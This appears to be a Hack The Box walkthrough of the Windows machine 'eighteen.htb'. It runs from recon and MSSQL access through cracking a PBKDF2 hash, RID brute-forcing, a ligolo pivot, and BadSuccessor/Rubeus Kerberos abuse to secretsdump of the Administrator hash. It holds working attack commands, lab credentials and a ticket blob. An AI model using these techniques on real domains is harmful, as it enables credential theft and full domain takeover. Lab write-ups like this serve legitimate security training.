# Initial recon 

#### nmap 
```
# Nmap 7.98 scan initiated Sun Feb  8 17:05:45 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -T4 --min-rate=5000 -oN nmap.txt -p- 10.129.14.35
Nmap scan report for eighteen.htb (10.129.14.35)
Host is up (0.22s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Welcome - eighteen.htb
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  8 17:06:31 2026 -- 1 IP address (1 host up) scanned in 46.24 seconds
```

port 80 
![[Pasted image 20260212092510.png]]

##### ffuf 
```bash
ffuf -u http://eighteen.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt 
________________________________________________

admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 210ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 860ms]
register                [Status: 200, Size: 2421, Words: 762, Lines: 76, Duration: 1396ms]
login                   [Status: 200, Size: 1961, Words: 602, Lines: 66, Duration: 1427ms]
.                       [Status: 200, Size: 2253, Words: 674, Lines: 74, Duration: 179ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 413ms]
features                [Status: 200, Size: 2822, Words: 849, Lines: 88, Duration: 333ms]

```

later after futher enum on the web .. nothing actually interresting , it seems like the web is a rabbit hole .. since its a windows machine. 
lets try some diff protocols with the credentials giving `kevin / iNa2we6haRj2gaw!`

##### nxc 
```bash
nxc smb 10.129.1.108 -u kevin -p 'iNa2we6haRj2gaw!'
nxc ldap 10.129.1.108 -u kevin -p 'iNa2we6haRj2gaw!'
nxc winrm 10.129.1.108 -u kevin -p 'iNa2we6haRj2gaw!'
nxc rdp 10.129.1.108 -u kevin -p 'iNa2we6haRj2gaw!'
nxc mssql 10.129.1.108 -u kevin -p 'iNa2we6haRj2gaw!'
```

mssql is accessible , well lets try it 

```bash 
impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@eighteen.htb 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> 
```

kevin is not usable here .. but theres something 
![[Pasted image 20260212093955.png]]

```
EXECUTE AS LOGIN = 'appdev';
```

![[Pasted image 20260212094043.png]]
list tables 
```
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
```

we found a hash 
![[Pasted image 20260212094215.png]]
looking at [hashcat exemple wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)
![[Pasted image 20260212094502.png]]
the example doesnt quiet aligne with the found hash 

```
#found hash 
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
#hashcat exmaple
 
$pbkdf2-sha256$29000$x9h7j/Ge8x6DMEao1VqrdQ$kra3R1wEnY8mPdDWOpTqOTINaAmZvRMcYd8u5OBQP9A
```

we have the hash part we need to convert it to base64 

```python
import base64, binascii 
salt = "AMtzteQIG7yAbZIa" 
hash_hex = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" 
hash_b64 = base64.b64encode(binascii.unhexlify(hash_hex)).decode() 
print(f"sha256:600000:{salt}:{hash_b64}")
```

final hash 
```
pbkdf2$sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1 
```

soo this password didnt change anything .. tried to connect with it the users on the db but nothing

also tried to bruteforce same thing ... NOTHING 
we need to get users first 

since mssql only works we can perform an RID attack to get the user s 

```bash
nxc mssql 10.129.1.108  -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth 
```

![[Pasted image 20260212100317.png]]
we have a list now 
```
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

again if we check only `àdam.Scott` worked for now . 
we check every protocal and we can actually winrm with it 

```bash
evil-winrm -u 'adam.scott' -p 'iloveyou1' -i 10.129.1.108 
```

![[Pasted image 20260212100541.png]]

## Post exploitation 

winpeas revealed another iface 
![[Pasted image 20260212121820.png]]

might be the DC01 .. lets pivot to that machine using `ligolo` , i used to prefer `shizel` but this is better 

first we create an interface 

```bash 
sudo ip tuntap add user $USER mode tun ligolo 
```

then we set it up

```
sudo ip link set ligolo up
```

we start the server on our machine 
![[Pasted image 20260212122118.png]]
then we upload the `agent` and execute it on the target machine 

![[Pasted image 20260212123012.png]]

we add the route to the iface now 

```bash 
sudo ip route add 240.0.0.1/32 dev ligolo 
```

![[Pasted image 20260212123803.png]]
agent joined , now we start the session 
![[Pasted image 20260212124002.png]]
and we can connect now

```powershell
./agent.exe -connect 10.10.14.56:11601 -ignore-cert 
```

![[Pasted image 20260212124028.png]]
we nmap again the pivoted host and we got this 

```bash
nmap -sV -sC -T4 --min-rate=5000 -oN nmap2.txt 240.0.0.1  -p- 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 06:46 -0500
Nmap scan report for 240.0.0.1
Host is up (0.013s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
80/tcp    open  tcpwrapped
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
9389/tcp  open  tcpwrapped
49701/tcp open  tcpwrapped

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-12T18:47:17
|_  start_date: N/A
|_clock-skew: 6h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.60 seconds
```

we can do ldap enum and everything . 

## Privilege Escalation  
after further enumeration we found out that the user `adam.scott` have the role of `createChild` which we can abuse it for root 

first we need to upload BadSuccessor on the machine 

```
Import-Module ./Invoke-BadSuccessor.ps1
```

we create a machine with this command 

```
Invoke-BadSuccessor 
```

this will create a machine with user `Pwn$` and password `Password123!`, we upload `Rubeus.exe` 

we generate a hash from Rubeus 

```
./Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:eighteen.htb
```

we use that hash to get the ticket 

```
./Rubeus.exe asktgt /user:Pwn$ /aes256:07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B  /domain:eighteen.htb
```

using that ticket we can now add the permession to our user 

```
./Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsett /nowrap /outfile:ticket.kirbi /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoQ4bDEVJR0hURUVOLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZWlnaHRlZW4uaHRio4IEIzCCBB+gAwIBEqEDAgECooIEEQSCBA3f+1WREaWLy/HRAw+uD6NL8yThhrso2HpCeMt68znT65UXGUGsy7FfZTahq1XPxF/q+FE96PbRxBg61KQSogN543PKfvX+KLUh53/fy1JOye8+zVaziyNp6QZjK+4jg7qqI8B9JnUBKseaJSnVvQHN/ya9u91CrRVEa+249eg+aH+Ud37FtPpBF0U9O9N6tVpsSSzsEzXoL6ljlkAaVmshoKy4mUvPXYFNOBDysY/JHJDCDhz8X5cncUWwbmxqYiBantNPlP0ioMj5oyHvGAvit0AmVTjIQWk5/ptPUCwmO0FfJhrkQejA7nSZ6d7TXFWnrYfEEwydU5aLqmtzR9ipfq2zJc84WHG9pNMMTNz9Bst89PKZ3RMSm0UWx0JBU74cVrmo/aWkv1L0+kJONXZNU6+XFTuIYzoE2HUc/2nqFuEwZEGqM2rJS6rdDh1eLQn4gM+bTRCJhv1+yzTEqNEEoOHHfKUnDaCSw9MTQpXhrGY0L8rqShbjQEXLQUIwgTHhU1Qr/QRI1d4PtICiSy/3xQNoXqOUsZtLrL6F6Xf4EMK5bNW2gJZng5nBldPC4PxPT+S0wltiBwQ8dHlgMby26KNkI9eboLgxtHthKP1PY9GMQS4itKDPDgyJYJ0SH2xBSVXDOxJZsRn0jW16xwCwGO9nGxF/55RuHF54Sb0biUQcAuQ/C2A8B7utG1dttcD5QbDG/4WFn+kzH+fX1xxtQ/c0Zs/HbGxgAfv0jh8cUXN5APdldnRT263wcIbmud5zHzHHyGfiRKUMl1tZZE4HApbtcu/hayNwlDQTSaSlV23X2A7Wz6UXXCrZUsd1yipwZfzrJuHBbyEuZcc98ve+cicr3ZcK9nPyGjAxrHTKMxyPyK788S67dnnudOtGJpXOmQIvi+fX6/WjnCV0BrP1ZlUloyOLSTGOZ0M2dIYYth6Tqb15vIwM14WVrwOg6SFVlJMtxrrClhrl3+PTe37dJ3uruhfRXspMnhugDuhWfZsmpC0wJXgfL40j4YpTUFDcGAyendH4wAzUJvo+f9Uo/pkHc3v8ENCqZfZBRf5s2CBTorrWTSRum5VPtfyd0Ovd4Bj+ZNvVZwxgAhT79ET/NZjx/RRS38uVma8qRtH/EgLHOnRUAZ2/u5O6NxTCY3AVU5AmC7a5bmDF9jV29JZ57+hi33Yn+MBh+Nx+x2clzQ7IB0rFDagrabVZhtmU6QnUh7OiaiyXfRDXfY/DRBx6gmg3gQvURRtABBAUDUVwuMfU99/8YcQYbfpgm91svIerQJrOqEJjPvl9SQVBI1fNf82sYHUVTy+AETJ4dkYWbYSIViQ0aYQmp4qv5cYH2aTW5vEJk0m7FFAN9Cm6xF133fUIkk+rYe1iWBjq96OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIFXRtR8vMqlXmxyo7IfILuVoYBiKOIOnanbVwqZ4Y5oToQ4bDEVJR0hURUVOLkhUQqIRMA+gAwIBAaEIMAYbBFB3biSjBwMFAEDhAAClERgPMjAyNjAyMTAwMzQ0MjhaphEYDzIwMjYwMjEwMTM0NDI4WqcRGA8yMDI2MDIxNzAzNDQyOFqoDhsMRUlHSFRFRU4uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxlaWdodGVlbi5odGI=
```

now the annoying part which is dumping the secrets which coasted alot of time for me 

```
sudo timedatectl set-ntp false
sudo date -s "$(curl -s -I http://240.0.0.1 | grep -i '^Date:' | cut -d' ' -f2-)"
date
curl -s -I http://240.0.0.1 | grep -i '^Date:'
impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator
```

dumped creds 
```
{*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up... 
```

we evil-winrm now and we get the flag 
![[Pasted image 20260212130322.png]]


